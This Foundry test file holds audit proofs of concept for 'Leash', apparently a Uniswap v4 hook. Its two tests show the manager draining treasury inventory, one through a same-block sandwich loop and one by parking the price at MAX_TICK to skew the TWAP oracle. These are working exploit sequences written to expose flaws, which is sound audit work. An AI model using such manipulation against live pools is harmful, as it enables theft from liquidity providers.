// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {SwapParams} from "v4-core/types/PoolOperation.sol";
import {PoolSwapTest} from "v4-core/test/PoolSwapTest.sol";
import {LiquidityAmounts} from "v4-periphery/src/libraries/LiquidityAmounts.sol";
import {Leash, Terms, Position, Mandate, EpochRecord} from "../../src/Leash.sol";

/// Audit PoCs. Each test asserts the property Leash is meant to guarantee; a failure is the finding.
/// Same setup as test/Leash.t.sol: 100/100 inventory at 1:1, position [-600, 600) L=1000e18, bond 10e18 in currency1
/// (the stablecoin), TWAP window 1800s, maxTickDeviation 100, minLiquidity 100e18, uptime 95%.
contract LeashAuditTest is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for *;

    uint160 constant FLAGS =
        uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_SWAP_FLAG);

    Leash leash;
    address alice = makeAddr("alice"); // manager
    address eve = makeAddr("eve"); // outsider
    uint40 auctionEnd;

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        address hook = address(FLAGS ^ (0x4444 << 144));
        deployCodeTo("Leash.sol:Leash", abi.encode(manager), hook);
        leash = Leash(hook);
        key = PoolKey(currency0, currency1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook));

        _approveAll(address(this));
        auctionEnd = uint40(block.timestamp + 1 days);
        leash.createMandate(key, SQRT_PRICE_1_1, _terms(), 100e18, 100e18, Position(-600, 600, 1_000e18));

        address[2] memory who = [alice, eve];
        for (uint256 i; i < 2; i++) {
            MockERC20(Currency.unwrap(currency0)).mint(who[i], 1_000e18);
            MockERC20(Currency.unwrap(currency1)).mint(who[i], 1_000e18);
            vm.startPrank(who[i]);
            _approveAll(who[i]);
            vm.stopPrank();
        }
    }

    function _approveAll(address) internal {
        address[2] memory spenders = [address(leash), address(swapRouter)];
        for (uint256 i; i < 2; i++) {
            MockERC20(Currency.unwrap(currency0)).approve(spenders[i], type(uint256).max);
            MockERC20(Currency.unwrap(currency1)).approve(spenders[i], type(uint256).max);
        }
    }

    function _terms() internal view returns (Terms memory) {
        return Terms({
            stableIs0: false,
            maxFee: 10_000,
            auctionEnd: auctionEnd,
            epochLength: 1 days,
            epochs: 3,
            minBond: 10e18,
            twapWindow: 1800,
            maxTickDeviation: 100,
            minLiquidity: 100e18,
            uptimeBps: 9500,
            managerFeeBps: 3000,
            startStableBps: 10_000,
            endStableBps: 10_000
        });
    }

    function _m() internal view returns (Mandate memory) {
        return leash.mandate(key.toId());
    }

    function _bal(Currency c, address who) internal view returns (uint256) {
        return MockERC20(Currency.unwrap(c)).balanceOf(who);
    }

    /// Value at the 1:1 market price.
    function _value(address who) internal view returns (uint256) {
        return _bal(currency0, who) + _bal(currency1, who);
    }

    function _tick() internal view returns (int24 tick) {
        (, tick,,) = manager.getSlot0(key.toId());
    }

    function _sqrt(int24 t) internal pure returns (uint160) {
        return TickMath.getSqrtPriceAtTick(t);
    }

    /// `who` swaps (exact output, effectively unlimited) until the price reaches `limit`.
    function _swapAs(address who, bool zeroForOne, uint160 limit) internal {
        vm.prank(who);
        swapRouter.swap(key, SwapParams(zeroForOne, 1e30, limit), PoolSwapTest.TestSettings(false, false), ZERO_BYTES);
    }

    function _swapToTick(address who, int24 t) internal {
        _swapAs(who, t < _tick(), _sqrt(t));
    }

    function _win() internal {
        vm.prank(alice);
        leash.bid(key, 10e18);
        vm.warp(auctionEnd);
        leash.checkpoint(key);
    }

    function _next(uint256 secs) internal {
        vm.warp(block.timestamp + secs);
        vm.roll(block.number + 1);
    }

    // ================================================================ C-1

    /// C-1. The manager sandwiches its own rebalance, many times inside one transaction. The guard compares spot to a
    /// TWAP that cannot move within a block, so every cycle passes: push spot +100 ticks through a min-liquidity
    /// position (almost free), re-place all inventory just behind spot, sell back to market into it, shrink again;
    /// then the mirror image. Each half-cycle buys/sells the treasury's whole side at ~0.5% off market, and the
    /// position never leaves compliance, so the bond is safe and the epoch settles clean.
    function test_C1_managerDrainsBySameBlockSandwichLoop() public {
        _win();
        vm.prank(alice);
        leash.setFee(key, 0);
        vm.prank(alice);
        leash.rebalance(key, -60, 60, 100e18);

        uint256 before = _value(alice);
        uint256 gasStart = gasleft();
        uint256 cycles = 25;
        for (uint256 i; i < cycles; i++) {
            // Up: spot to +60, all currency1 into [0, 60) (spot on its upper edge: needs no currency0),
            // sell currency0 back to market into it: the treasury buys currency0 ~0.3% above market.
            _swapToTick(alice, 60);
            uint128 l1 = LiquidityAmounts.getLiquidityForAmount1(_sqrt(0), _sqrt(60), _m().idle1) * 99 / 100;
            vm.prank(alice);
            leash.rebalance(key, 0, 60, l1);
            _swapToTick(alice, 0);
            vm.prank(alice);
            leash.rebalance(key, -60, 60, 100e18);
            // Down: spot to -60, all currency0 into [-60, 60) (spot on its lower edge: needs no currency1),
            // buy currency0 back to market: the treasury sells currency0 below market.
            _swapToTick(alice, -60);
            uint128 l0 = LiquidityAmounts.getLiquidityForAmount0(_sqrt(-60), _sqrt(60), _m().idle0) * 99 / 100;
            vm.prank(alice);
            leash.rebalance(key, -60, 60, l0);
            _swapToTick(alice, 0);
            vm.prank(alice);
            leash.rebalance(key, -60, 60, 100e18);
        }
        emit log_named_uint("gas per full cycle", (gasStart - gasleft()) / cycles);
        uint256 gain = _value(alice) - before;
        emit log_named_decimal_uint("manager gain in one tx (tokens at 1:1)", gain, 18);
        assertEq(leash.twapTick(key), 0, "TWAP never moved");

        // The epoch stays clean: the manager keeps the bond and is paid on top.
        vm.warp(auctionEnd + 1 days);
        leash.settle(key, 0);
        assertTrue(leash.epochRecord(key.toId(), 0).clean, "epoch clean");
        assertEq(_m().bond, 10e18, "bond intact");

        assertLe(gain, 1e18, "manager extracted treasury inventory");
    }

    // ================================================================ C-2

    /// C-2. Outside the hook's own range the pool has no liquidity, so the price can be parked at MAX_TICK for free.
    /// One 12s block there adds 887271*12 to the tick accumulator: the 30-min TWAP jumps to ~5915 (x1.8). The manager
    /// then moves spot down to that TWAP (still free), so |spot - TWAP| = 0 and the guard passes; re-places the
    /// whole inventory in [0, ~5940) and sells currency0 down to market into it, buying the stablecoin at up to 1.8x.
    /// The new range still holds the TWAP as it decays back to 0, so the epoch stays clean.
    function test_C2_managerDrainsByParkingPriceAtMaxTickForOneBlock() public {
        _win();
        vm.startPrank(alice);
        leash.setFee(key, 0);
        leash.rebalance(key, -60, 60, 100e18); // a minimal position makes the push nearly free
        vm.stopPrank();
        uint256 before = _value(alice);

        _swapAs(alice, false, TickMath.MAX_SQRT_PRICE - 1); // through the dust position, then free to MAX_TICK
        _next(12);
        int24 t = leash.twapTick(key);
        emit log_named_int("TWAP after one block at MAX_TICK", t);
        _swapToTick(alice, t); // writes the observation; free fall to the TWAP
        int24 hi = (t / 60 + 1) * 60;
        Mandate memory m = _m();
        uint128 l = LiquidityAmounts.getLiquidityForAmounts(_sqrt(t), _sqrt(0), _sqrt(hi), m.idle0, m.idle1) * 99 / 100;
        vm.prank(alice);
        leash.rebalance(key, 0, hi, l); // passes the guard: spot == TWAP
        _swapToTick(alice, 1); // sell currency0 into the treasury's bid, back to market (tick 1 stays inside the range)

        uint256 gain = _value(alice) - before;
        emit log_named_decimal_uint("manager gain (tokens at 1:1)", gain, 18);

        // Keeper every minute for the rest of the epoch: still clean, bond kept.
        while (block.timestamp + 1 minutes <= auctionEnd + 1 days) {
            _next(1 minutes);
            leash.checkpoint(key);
        }
        vm.warp(auctionEnd + 1 days);
        leash.settle(key, 0);
        assertTrue(leash.epochRecord(key.toId(), 0).clean, "epoch clean");
        assertEq(_m().bond, 10e18, "bond intact");

        assertLe(gain, 1e18, "manager extracted treasury inventory");
    }
}
